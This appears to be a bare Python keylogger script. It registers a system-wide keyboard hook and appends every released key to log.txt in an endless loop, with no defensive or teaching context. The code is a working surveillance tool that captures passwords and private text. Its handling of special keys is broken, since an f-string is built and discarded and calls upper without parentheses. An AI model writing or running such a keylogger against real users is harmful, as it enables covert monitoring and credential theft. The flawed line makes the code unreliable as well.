import keyboard
from time import sleep
def key_press(event):
    name = event.name
    if len(name)>1:
        if name == "space":
            name = ' '
        elif name == "enter":
            name = '[ENTER]\n'
        elif name == 'backspace':
            name = '-'
        else:
            f'[{name.upper}'
    with open('log.txt', 'a') as f:
        f.write('{}'.format(name))





keyboard.on_release(key_press)

while True:
    pass









